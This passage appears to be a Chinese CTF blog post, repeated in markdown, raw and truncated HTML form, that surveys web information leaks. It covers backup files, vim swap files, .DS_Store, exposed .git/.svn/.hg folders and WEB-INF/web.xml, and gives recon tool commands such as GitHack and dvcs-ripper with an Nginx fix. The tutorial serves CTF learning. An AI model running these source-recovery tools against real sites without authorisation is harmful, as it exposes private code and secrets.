git):\n```bash\nrip-git.pl -v -u URL/.git/\n\nIt will automatically do git checkout -f\n```\n\nor if you would like to ignore SSL certification verification (with -s):\n```bash\nrip-git.pl -s -v -u http://www.example.com/.git/\n```\n\n![Git常用命令](/img/20200825145004389.jpg)\n\n### log\n\nlog即指git中的日志，通过 `git log`命令来查看该项目的日志，然后用`git diff `命令来查看现版本和之前版本有什么不同，或者用`git reset`命令直接回到该版本。\n\n### stash\n\nstash就相当于一个临时储存列表，当程序员想要调试该版本又不想丢掉之前某个版本的时候，就可以使用`git stash`命令将本地修改保存起来，并回到之前的版本。\n\n```bash\n通过git stash存储的修改列表,可以通过git stash list查看.\n\ngit stash show用于校验.\n\ngit stash apply用于重新存储.\n\n直接执行git stash等同于git stash save.\n```\n\n最新的存储保存在refs/stash中.老的存储可以通过相关的参数获得,例如stash@{0}获取最新的存储,stash@{1}获取次新.stash@{2.hour.ago}获取两小时之前的.存储可以直接通过索引的位置来获得stash@{n}.\n\n步骤：\n\n1.用`git stash list`命令查看储存列表\n\n2.用`git stash show`查看该版本有什么不同\n\n3.用`git stash pop stash@{n}`来释放这个版本，n为要释放的版本的索引。\n\n### index\n\nindex是Git本地库中的索引，是一个二进制文件。索引中包含一个列表，列表根据文件名、文件模式和文件元数据进行了排序，以便快速检测文件的变化。\n\n索引中还包含所有Blob类型的SHA-1标识符。\n\n> **Git文件状态**\n>\n> 对于新创建的一个文件，其状态为untracked。\n>\n> 通过git add ...命令，可以将该新建文件的状态转换为staged，这个过程就是将新建文件加入到Index中。\n>\n> 通过git commit命令，可以将处于staged状态的文件提交到本地库的HEAD。\n\n**关键**\n\n`git checkout-index`命令\n\n**将Index中列表的文件检出到工作目录，默认不覆盖已有文件**。\n\n\n\n- -u, --index，更新所有检出的文件的stat信息（git status）\n- -a, --all，检出Index中列表的所有文件\n- -f, --force，检出时覆盖已有文件\n- -n, --no-create，只再次检出工作目录中已有的文件（不创建任何新文件）\n- --，禁用任何参数\n\n例如：\n\n- 从Index检出已有文件的最新版本，并覆盖\n\n```\ngit checkout-index -n -f\n```\n\n- 检出全部文件到git-export-dir目录\n\n```\ngit checkout-index -a --prefix=git-export-dir/\n```\n\n- 检出文件Makefile，并重命名为.merged-Makefile\n\n```\ngit checkout-index --prefix=.merged- Makefile\n```\n\n**可能有用**\n\n1. `git update-index`命令\n    将工作目录中的文件加入到index列表中。\n    不建议使用该命令，同样情况下推荐使用git add\n\n如下命令完全等价：\n\n- 为myFile文件设置可执行权限\n\n```\ngit add --chmod=+x myFile\ngit update-index --chmod=+x myFile\n```\n\n- 为myFile文件撤销可执行权限\n\n```\ngit add --chmod=-x myFilegit update-index --chmod=-x myFile\n```\n\n\n\n2. `git merge-index`命令\n 为Index中需要合并的文件执行合并操作。\n 基本用法：\n\n```\ngit merge-index [-o] [-q] <merge-program> (-a | [--] <file>*)\n```\n\n示例：\n\n```\ngit merge-index cat a_script_file\n```\n\n\n\nGit的内容挺多的，以上只涉及到了跟CTF有关的内容，以后有机会还得深入了解学习一下。\n\n## SVN泄露\n\n> 当开发人员使用 SVN （Subversion）进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。\n\n使用工具dvcs-ripper  链接：https://github.com/kost/dvcs-ripper\n\n在windows上使用没成功，环境不对，安装了active Perl也不行，还缺少个SQLite和什么东西，于是直接在kali上使用好了\n\n- 安装：`sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl`\n- gitclone: `git clone https://github.com/kost/dvcs-ripper`\n- 进入目录\n- 命令： `./rip-svn.pl -v -u http://www.example.com/.svn/`\n\n然后会克隆下来一个.svn文件夹，默认是隐藏文件夹，按Ctrl+H显示，之后自行寻找.svn文件夹中关于flag的线索即可\n\n如果系统中有Subversion的话，\n\n通过svn命令可以根据时间或修订号去除过去的版本，或者某一版本所做的具体的修改。以下四个命令可以用来查看svn 的历史：\n\n- **svn log:** 用来展示svn 的版本作者、日期、路径等等。\n- **svn diff:** 用来显示特定修改的行级详细信息。\n- **svn cat:** 取得在特定版本的某文件显示在当前屏幕。\n- **svn list:** 显示一个目录或某一版本存在的文件。\n\n## HG泄露\n\n> **Mercurial**是[跨平台](https://zh.wikipedia.org/wiki/跨平台)的[分布式版本控制](https://zh.wikipedia.org/wiki/分布式版本控制)软件，主要由[Python](https://zh.wikipedia.org/wiki/Python)语言实现，但也包含用[C语言](https://zh.wikipedia.org/wiki/C语言)实现的二进制比较工具。Mercurial一开始的主要运行平台是[Linux](https://zh.wikipedia.org/wiki/Linux)，现在Mercurial已经移植到[Windows](https://zh.wikipedia.org/wiki/Windows)、[Mac OS X](https://zh.wikipedia.org/wiki/Mac_OS_X)和大多数的[类Unix](https://zh.wikipedia.org/wiki/类Unix)系统中。Mercurial主要由[命令行](https://zh.wikipedia.org/wiki/命令行界面)程序组成，现在也有了[图形用户界面](https://zh.wikipedia.org/wiki/图形用户界面)。对Mercurial的所有操作都由用不同的关键字作为参数调用程序“hg”来实现，Hg是参考[水银](https://zh.wikipedia.org/wiki/水银)的[化学符号](https://zh.wikipedia.org/wiki/化学符号)而取的名字。\n\n当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。\n\n仍然使用dvcs-ripper工具将.hg文件夹克隆到本地。然后可以使用命令查找 ，也可以使用手工查找。\n\n遇到这种版本控制系统的信息泄露情况，如果会使用这些版本空控制系统，显然会有很多的好处。如果不熟悉它们的话，也不用太过担心，很多时候手工也能找到有用信息。不过有机会还是学习使用一下这些版本控制系统，或者了解一些原理和命令好了，毕竟没有坏处。\n\n## CVS泄露\n\n还是使用dvcs-ripper工具克隆然后分析。\n\n以后有机会详细学习记录一下这几个常见的版本控制系统吧。\n\n## WEB-INF/web.xml泄露\n\nWEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：\n\n```\n /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。\n\n​     \n\n  /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中\n\n​     \n\n  /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件\n\n​     \n\n  /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。\n\n​  \n\n  /WEB-INF/database.properties：数据库配置文件\n\n```\n\n漏洞成因：\n\n​\t通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。\n\n**漏洞检测以及利用方法**：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。\n\n一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！","source":"_posts/2021-1-12-CTF-web-信息泄露.md","raw":"---\nlayout: post\ntitle: ctf中的信息泄露\ndate: 2021-1-11\ncategories: blog\ntags: [ctf,web]\ndescription: 详解ctf中的信息泄露\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n# 信息泄露总结\n\n## 目录遍历\n\n顾名思义，就是翻找目录。查找目录中的有用信息。一般来说要结合dirsearch或御剑等工具来进行查找。\n\n## phpinfo\n\n在可以“有限”地执行php命令地地方执行phpinfo()函数，可以得到服务器php配置的信息，比如：环境变量，可用模块，网站绝对路径，服务器操作系统，使用的组件等，为之后的操作提供思路和帮助。\n\n## 备份文件下载\n\n### 网站源码泄露\n\n当开发人员在线上环境中对源代码进行了备份操作，并且不小心将备份文件放在了 web 目录下，就会引起网站源码泄露。\n\n常见的的文件名：\n\nwww\n\nwwwroot\n\nback\n\nbackup\n\nweb\n\nwebsite\n\ntemp\n\n常见的后缀：\n\nzip\n\nrar\n\ntar\n\ntar.gz\n\n### bak文件\n\n有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个或某部分文件的源代码。\n\n即：文件名后面加后缀 .bak\n\n### vim缓存\n\n当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。\n\n \n\n非正常关闭vim编辑器时会生成一个.swp文件\n\n在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。\n\n以 index.php 为例：\n\n第一次产生的交换文件名为 .index.php.swp\n\n再次意外退出后，将会产生名为 .index.php.swo 的交换文件\n\n第三次产生的交换文件则为 .index.php.swn。\n\n可以放到linux系统中使用vim工具加参数 -r修复此备份文件并打开\n\n### .DS_Store文件\n\n.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。\n\n**通过.DS_Store可以知道这个目录里面所有文件的清单。**\n\n.DS_Store可以直接使用记事本打开，但是打开后乱码居多；也可以使用 Python-dsstore 这个工具 (https://github.com/gehaxelt/Python-dsstore)  来完成 .DS_Store 文件的解析，直观一些。\n\n\n\n## 版本控制系统有关的泄露（Git、SVN、HG）\n\n### 版本控制系统\n\n集中式版本控制系统：Subversion(SVN)、CVS、VSS 等。\n分布式版本控制系统：Git、Mercurial(Hg) 等。\n\n对于各个版本控制系统的区别的分析介绍:https://www.cnblogs.com/likebeta/archive/2012/12/18/2822805.html\n\n## Git泄露\n\n漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。\n\n\n1.漏洞利用：工具：GitHack （https://github.com/BugScanTeam/GitHack） 或 dvcs-ripper （https://github.com/kost/dvcs-ripper）\n\n**GitHack**\n\n使用方法：\n\n```\npython2 GitHack.py URL/.git/\n```\n\n**dvcs-ripper**\n\n使用方法:\n\nExample run (for git):\n```bash\nrip-git.pl -v -u URL/.git/\n\nIt will automatically do git checkout -f\n```\n\nor if you would like to ignore SSL certification verification (with -s):\n```bash\nrip-git.pl -s -v -u http://www.example.com/.git/\n```\n\n![Git常用命令](/img/20200825145004389.jpg)\n\n### log\n\nlog即指git中的日志，通过 `git log`命令来查看该项目的日志，然后用`git diff `命令来查看现版本和之前版本有什么不同，或者用`git reset`命令直接回到该版本。\n\n### stash\n\nstash就相当于一个临时储存列表，当程序员想要调试该版本又不想丢掉之前某个版本的时候，就可以使用`git stash`命令将本地修改保存起来，并回到之前的版本。\n\n```bash\n通过git stash存储的修改列表,可以通过git stash list查看.\n\ngit stash show用于校验.\n\ngit stash apply用于重新存储.\n\n直接执行git stash等同于git stash save.\n```\n\n最新的存储保存在refs/stash中.老的存储可以通过相关的参数获得,例如stash@{0}获取最新的存储,stash@{1}获取次新.stash@{2.hour.ago}获取两小时之前的.存储可以直接通过索引的位置来获得stash@{n}.\n\n步骤：\n\n1.用`git stash list`命令查看储存列表\n\n2.用`git stash show`查看该版本有什么不同\n\n3.用`git stash pop stash@{n}`来释放这个版本，n为要释放的版本的索引。\n\n### index\n\nindex是Git本地库中的索引，是一个二进制文件。索引中包含一个列表，列表根据文件名、文件模式和文件元数据进行了排序，以便快速检测文件的变化。\n\n索引中还包含所有Blob类型的SHA-1标识符。\n\n> **Git文件状态**\n>\n> 对于新创建的一个文件，其状态为untracked。\n>\n> 通过git add ...命令，可以将该新建文件的状态转换为staged，这个过程就是将新建文件加入到Index中。\n>\n> 通过git commit命令，可以将处于staged状态的文件提交到本地库的HEAD。\n\n**关键**\n\n`git checkout-index`命令\n\n**将Index中列表的文件检出到工作目录，默认不覆盖已有文件**。\n\n\n\n- -u, --index，更新所有检出的文件的stat信息（git status）\n- -a, --all，检出Index中列表的所有文件\n- -f, --force，检出时覆盖已有文件\n- -n, --no-create，只再次检出工作目录中已有的文件（不创建任何新文件）\n- --，禁用任何参数\n\n例如：\n\n- 从Index检出已有文件的最新版本，并覆盖\n\n```\ngit checkout-index -n -f\n```\n\n- 检出全部文件到git-export-dir目录\n\n```\ngit checkout-index -a --prefix=git-export-dir/\n```\n\n- 检出文件Makefile，并重命名为.merged-Makefile\n\n```\ngit checkout-index --prefix=.merged- Makefile\n```\n\n**可能有用**\n\n1. `git update-index`命令\n    将工作目录中的文件加入到index列表中。\n    不建议使用该命令，同样情况下推荐使用git add\n\n如下命令完全等价：\n\n- 为myFile文件设置可执行权限\n\n```\ngit add --chmod=+x myFile\ngit update-index --chmod=+x myFile\n```\n\n- 为myFile文件撤销可执行权限\n\n```\ngit add --chmod=-x myFilegit update-index --chmod=-x myFile\n```\n\n\n\n2. `git merge-index`命令\n 为Index中需要合并的文件执行合并操作。\n 基本用法：\n\n```\ngit merge-index [-o] [-q] <merge-program> (-a | [--] <file>*)\n```\n\n示例：\n\n```\ngit merge-index cat a_script_file\n```\n\n\n\nGit的内容挺多的，以上只涉及到了跟CTF有关的内容，以后有机会还得深入了解学习一下。\n\n## SVN泄露\n\n> 当开发人员使用 SVN （Subversion）进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。\n\n使用工具dvcs-ripper  链接：https://github.com/kost/dvcs-ripper\n\n在windows上使用没成功，环境不对，安装了active Perl也不行，还缺少个SQLite和什么东西，于是直接在kali上使用好了\n\n- 安装：`sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl`\n- gitclone: `git clone https://github.com/kost/dvcs-ripper`\n- 进入目录\n- 命令： `./rip-svn.pl -v -u http://www.example.com/.svn/`\n\n然后会克隆下来一个.svn文件夹，默认是隐藏文件夹，按Ctrl+H显示，之后自行寻找.svn文件夹中关于flag的线索即可\n\n如果系统中有Subversion的话，\n\n通过svn命令可以根据时间或修订号去除过去的版本，或者某一版本所做的具体的修改。以下四个命令可以用来查看svn 的历史：\n\n- **svn log:** 用来展示svn 的版本作者、日期、路径等等。\n- **svn diff:** 用来显示特定修改的行级详细信息。\n- **svn cat:** 取得在特定版本的某文件显示在当前屏幕。\n- **svn list:** 显示一个目录或某一版本存在的文件。\n\n## HG泄露\n\n> **Mercurial**是[跨平台](https://zh.wikipedia.org/wiki/跨平台)的[分布式版本控制](https://zh.wikipedia.org/wiki/分布式版本控制)软件，主要由[Python](https://zh.wikipedia.org/wiki/Python)语言实现，但也包含用[C语言](https://zh.wikipedia.org/wiki/C语言)实现的二进制比较工具。Mercurial一开始的主要运行平台是[Linux](https://zh.wikipedia.org/wiki/Linux)，现在Mercurial已经移植到[Windows](https://zh.wikipedia.org/wiki/Windows)、[Mac OS X](https://zh.wikipedia.org/wiki/Mac_OS_X)和大多数的[类Unix](https://zh.wikipedia.org/wiki/类Unix)系统中。Mercurial主要由[命令行](https://zh.wikipedia.org/wiki/命令行界面)程序组成，现在也有了[图形用户界面](https://zh.wikipedia.org/wiki/图形用户界面)。对Mercurial的所有操作都由用不同的关键字作为参数调用程序“hg”来实现，Hg是参考[水银](https://zh.wikipedia.org/wiki/水银)的[化学符号](https://zh.wikipedia.org/wiki/化学符号)而取的名字。\n\n当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。\n\n仍然使用dvcs-ripper工具将.hg文件夹克隆到本地。然后可以使用命令查找 ，也可以使用手工查找。\n\n遇到这种版本控制系统的信息泄露情况，如果会使用这些版本空控制系统，显然会有很多的好处。如果不熟悉它们的话，也不用太过担心，很多时候手工也能找到有用信息。不过有机会还是学习使用一下这些版本控制系统，或者了解一些原理和命令好了，毕竟没有坏处。\n\n## CVS泄露\n\n还是使用dvcs-ripper工具克隆然后分析。\n\n以后有机会详细学习记录一下这几个常见的版本控制系统吧。\n\n## WEB-INF/web.xml泄露\n\nWEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：\n\n```\n /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。\n\n​     \n\n  /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中\n\n​     \n\n  /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件\n\n​     \n\n  /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。\n\n​  \n\n  /WEB-INF/database.properties：数据库配置文件\n\n```\n\n漏洞成因：\n\n​\t通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。\n\n**漏洞检测以及利用方法**：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。\n\n一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！","slug":"2021-1-12-CTF-web-信息泄露","published":1,"updated":"2021-01-14T15:10:21.868Z","comments":1,"photos":[],"link":"","_id":"ckkntx9km002pxov7c8j3ylrd","content":"<h1 id=\"信息泄露总结\"><a href=\"#信息泄露总结\" class=\"headerlink\" title=\"信息泄露总结\"></a>信息泄露总结</h1><h2 id=\"目录遍历\"><a href=\"#目录遍历\" class=\"headerlink\" title=\"目录遍历\"></a>目录遍历</h2><p>顾名思义，就是翻找目录。查找目录中的有用信息。一般来说要结合dirsearch或御剑等工具来进行查找。</p>\n<h2 id=\"phpinfo\"><a href=\"#phpinfo\" class=\"headerlink\" title=\"phpinfo\"></a>phpinfo</h2><p>在可以“有限”地执行php命令地地方执行phpinfo()函数，可以得到服务器php配置的信息，比如：环境变量，可用模块，网站绝对路径，服务器操作系统，使用的组件等，为之后的操作提供思路和帮助。</p>\n<h2 id=\"备份文件下载\"><a href=\"#备份文件下载\" class=\"headerlink\" title=\"备份文件下载\"></a>备份文件下载</h2><h3 id=\"网站源码泄露\"><a href=\"#网站源码泄露\" class=\"headerlink\" title=\"网站源码泄露\"></a>网站源码泄露</h3><p>当开发人员在线上环境中对源代码进行了备份操作，并且不小心将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>\n<p>常见的的文件名：</p>\n<p>www</p>\n<p>wwwroot</p>\n<p>back</p>\n<p>backup</p>\n<p>web</p>\n<p>website</p>\n<p>temp</p>\n<p>常见的后缀：</p>\n<p>zip</p>\n<p>rar</p>\n<p>tar</p>\n<p>tar.gz</p>\n<h3 id=\"bak文件\"><a href=\"#bak文件\" class=\"headerlink\" title=\"bak文件\"></a>bak文件</h3><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个或某部分文件的源代码。</p>\n<p>即：文件名后面加后缀 .bak</p>\n<h3 id=\"vim缓存\"><a href=\"#vim缓存\" class=\"headerlink\" title=\"vim缓存\"></a>vim缓存</h3><p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p>\n<p>非正常关闭vim编辑器时会生成一个.swp文件</p>\n<p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。</p>\n<p>以 index.php 为例：</p>\n<p>第一次产生的交换文件名为 .index.php.swp</p>\n<p>再次意外退出后，将会产生名为 .index.php.swo 的交换文件</p>\n<p>第三次产生的交换文件则为 .index.php.swn。</p>\n<p>可以放到linux系统中使用vim工具加参数 -r修复此备份文件并打开</p>\n<h3 id=\"DS-Store文件\"><a href=\"#DS-Store文件\" class=\"headerlink\" title=\".DS_Store文件\"></a>.DS_Store文件</h3><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。</p>\n<p><strong>通过.DS_Store可以知道这个目录里面所有文件的清单。</strong></p>\n<p>.DS_Store可以直接使用记事本打开，但是打开后乱码居多；也可以使用 Python-dsstore 这个工具 (<a href=\"https://github.com/gehaxelt/Python-dsstore\" target=\"_blank\" rel=\"noopener\">https://github.com/gehaxelt/Python-dsstore</a>)  来完成 .DS_Store 文件的解析，直观一些。</p>\n<h2 id=\"版本控制系统有关的泄露（Git、SVN、HG）\"><a href=\"#版本控制系统有关的泄露（Git、SVN、HG）\" class=\"headerlink\" title=\"版本控制系统有关的泄露（Git、SVN、HG）\"></a>版本控制系统有关的泄露（Git、SVN、HG）</h2><h3 id=\"版本控制系统\"><a href=\"#版本控制系统\" class=\"headerlink\" title=\"版本控制系统\"></a>版本控制系统</h3><p>集中式版本控制系统：Subversion(SVN)、CVS、VSS 等。<br>分布式版本控制系统：Git、Mercurial(Hg) 等。</p>\n<p>对于各个版本控制系统的区别的分析介绍:<a href=\"https://www.cnblogs.com/likebeta/archive/2012/12/18/2822805.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/likebeta/archive/2012/12/18/2822805.html</a></p>\n<h2 id=\"Git泄露\"><a href=\"#Git泄露\" class=\"headerlink\" title=\"Git泄露\"></a>Git泄露</h2><p>漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p>\n<p>1.漏洞利用：工具：GitHack （<a href=\"https://github.com/BugScanTeam/GitHack）\" target=\"_blank\" rel=\"noopener\">https://github.com/BugScanTeam/GitHack）</a> 或 dvcs-ripper （<a href=\"https://github.com/kost/dvcs-ripper）\" target=\"_blank\" rel=\"noopener\">https://github.com/kost/dvcs-ripper）</a></p>\n<p><strong>GitHack</strong></p>\n<p>使用方法：</p>\n<pre><code>python2 GitHack.py URL/.git/</code></pre><p><strong>dvcs-ripper</strong></p>\n<p>使用方法:</p>\n<p>Example run (for git):</p>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">rip-git.pl -v -u URL/.git/\n\nIt will automatically <span class=\"token keyword\">do</span> <span class=\"token function\">git</span> checkout -f<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>or if you would like to ignore SSL certification verification (with -s):</p>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">rip-git.pl -s -v -u http://www.example.com/.git/<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"/img/20200825145004389.jpg\" alt=\"Git常用命令\"></p>\n<h3 id=\"log\"><a href=\"#log\" class=\"headerlink\" title=\"log\"></a>log</h3><p>log即指git中的日志，通过 <code>git log</code>命令来查看该项目的日志，然后用<code>git diff</code>命令来查看现版本和之前版本有什么不同，或者用<code>git reset</code>命令直接回到该版本。</p>\n<h3 id=\"stash\"><a href=\"#stash\" class=\"headerlink\" title=\"stash\"></a>stash</h3><p>stash就相当于一个临时储存列表，当程序员想要调试该版本又不想丢掉之前某个版本的时候，就可以使用<code>git stash</code>命令将本地修改保存起来，并回到之前的版本。</p>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">通过git stash存储的修改列表,可以通过git stash list查看.\n\n<span class=\"token function\">git</span> stash show用于校验.\n\n<span class=\"token function\">git</span> stash apply用于重新存储.\n\n直接执行git stash等同于git stash save.<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>最新的存储保存在refs/stash中.老的存储可以通过相关的参数获得,例如stash@{0}获取最新的存储,stash@{1}获取次新.stash@{2.hour.ago}获取两小时之前的.存储可以直接通过索引的位置来获得stash@{n}.</p>\n<p>步骤：</p>\n<p>1.用<code>git stash list</code>命令查看储存列表</p>\n<p>2.用<code>git stash show</code>查看该版本有什么不同</p>\n<p>3.用<code>git stash pop stash@{n}</code>来释放这个版本，n为要释放的版本的索引。</p>\n<h3 id=\"index\"><a href=\"#index\" class=\"headerlink\" title=\"index\"></a>index</h3><p>index是Git本地库中的索引，是一个二进制文件。索引中包含一个列表，列表根据文件名、文件模式和文件元数据进行了排序，以便快速检测文件的变化。</p>\n<p>索引中还包含所有Blob类型的SHA-1标识符。</p>\n<blockquote>\n<p><strong>Git文件状态</strong></p>\n<p>对于新创建的一个文件，其状态为untracked。</p>\n<p>通过git add …命令，可以将该新建文件的状态转换为staged，这个过程就是将新建文件加入到Index中。</p>\n<p>通过git commit命令，可以将处于staged状态的文件提交到本地库的HEAD。</p>\n</blockquote>\n<p><strong>关键</strong></p>\n<p><code>git checkout-index</code>命令</p>\n<p><strong>将Index中列表的文件检出到工作目录，默认不覆盖已有文件</strong>。</p>\n<ul>\n<li>-u, –index，更新所有检出的文件的stat信息（git status）</li>\n<li>-a, –all，检出Index中列表的所有文件</li>\n<li>-f, –force，检出时覆盖已有文件</li>\n<li>-n, –no-create，只再次检出工作目录中已有的文件（不创建任何新文件）</li>\n<li>–，禁用任何参数</li>\n</ul>\n<p>例如：</p>\n<ul>\n<li>从Index检出已有文件的最新版本，并覆盖</li>\n</ul>\n<pre><code>git checkout-index -n -f</code></pre><ul>\n<li>检出全部文件到git-export-dir目录</li>\n</ul>\n<pre><code>git checkout-index -a --prefix=git-export-dir/</code></pre><ul>\n<li>检出文件Makefile，并重命名为.merged-Makefile</li>\n</ul>\n<pre><code>git checkout-index --prefix=.merged- Makefile</code></pre><p><strong>可能有用</strong></p>\n<ol>\n<li><code>git update-index</code>命令<br> 将工作目录中的文件加入到index列表中。<br> 不建议使用该命令，同样情况下推荐使用git add</li>\n</ol>\n<p>如下命令完全等价：</p>\n<ul>\n<li>为myFile文件设置可执行权限</li>\n</ul>\n<pre><code>git add --chmod=+x myFile\ngit update-index --chmod=+x myFile</code></pre><ul>\n<li>为myFile文件撤销可执行权限</li>\n</ul>\n<pre><code>git add --chmod=-x myFilegit update-index --chmod=-x myFile</code></pre><ol start=\"2\">\n<li><code>git merge-index</code>命令<br>为Index中需要合并的文件执行合并操作。<br>基本用法：</li>\n</ol>\n<pre><code>git merge-index [-o] [-q] &lt;merge-program&gt; (-a | [--] &lt;file&gt;*)</code></pre><p>示例：</p>\n<pre><code>git merge-index cat a_script_file</code></pre><p>Git的内容挺多的，以上只涉及到了跟CTF有关的内容，以后有机会还得深入了解学习一下。</p>\n<h2 id=\"SVN泄露\"><a href=\"#SVN泄露\" class=\"headerlink\" title=\"SVN泄露\"></a>SVN泄露</h2><blockquote>\n<p>当开发人员使用 SVN （Subversion）进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>\n</blockquote>\n<p>使用工具dvcs-ripper  链接：<a href=\"https://github.com/kost/dvcs-ripper\" target=\"_blank\" rel=\"noopener\">https://github.com/kost/dvcs-ripper</a></p>\n<p>在windows上使用没成功，环境不对，安装了active Perl也不行，还缺少个SQLite和什么东西，于是直接在kali上使用好了</p>\n<ul>\n<li>安装：<code>sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</code></li>\n<li>gitclone: <code>git clone https://github.com/kost/dvcs-ripper</code></li>\n<li>进入目录</li>\n<li>命令： <code>./rip-svn.pl -v -u http://www.example.com/.svn/</code></li>\n</ul>\n<p>然后会克隆下来一个.svn文件夹，默认是隐藏文件夹，按Ctrl+H显示，之后自行寻找.svn文件夹中关于flag的线索即可</p>\n<p>如果系统中有Subversion的话，</p>\n<p>通过svn命令可以根据时间或修订号去除过去的版本，或者某一版本所做的具体的修改。以下四个命令可以用来查看svn 的历史：</p>\n<ul>\n<li><strong>svn log:</strong> 用来展示svn 的版本作者、日期、路径等等。</li>\n<li><strong>svn diff:</strong> 用来显示特定修改的行级详细信息。</li>\n<li><strong>svn cat:</strong> 取得在特定版本的某文件显示在当前屏幕。</li>\n<li><strong>svn list:</strong> 显示一个目录或某一版本存在的文件。</li>\n</ul>\n<h2 id=\"HG泄露\"><a href=\"#HG泄露\" class=\"headerlink\" title=\"HG泄露\"></a>HG泄露</h2><blockquote>\n<p><strong>Mercurial</strong>是<a href=\"https://zh.wikipedia.org/wiki/跨平台\" target=\"_blank\" rel=\"noopener\">跨平台</a>的<a href=\"https://zh.wikipedia.org/wiki/分布式版本控制\" target=\"_blank\" rel=\"noopener\">分布式版本控制</a>软件，主要由<a href=\"https://zh.wikipedia.org/wiki/Python\" target=\"_blank\" rel=\"noopener\">Python</a>语言实现，但也包含用<a href=\"https://zh.wikipedia.org/wiki/C语言\" target=\"_blank\" rel=\"noopener\">C语言</a>实现的二进制比较工具。Mercurial一开始的主要运行平台是<a href=\"https://zh.wikipedia.org/wiki/Linux\" target=\"_blank\" 